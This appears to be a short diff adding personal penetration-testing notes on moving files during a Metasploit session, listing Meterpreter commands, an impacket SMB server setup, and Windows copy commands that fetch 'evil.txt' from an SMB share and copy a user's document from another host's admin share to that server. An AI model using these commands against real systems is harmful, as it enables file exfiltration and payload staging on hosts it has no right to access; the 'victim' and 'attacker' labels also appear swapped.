@@ -1,0 +1,21 @@
+Copy/Download/Upload Metasploit
+
+getuid
+
+help
+
+lpwd
+lls
+
+#################
+run on victim:
+impacket-smbserver test .
+
+run on attacker:
+copy \\192.168.122.128\test\evil.txt .
+
+#####################
+
+copy \\192.168.122.132\c$\users\jane.doe\Documents\test\hello.txt \\192.168.122.128\test
+
+
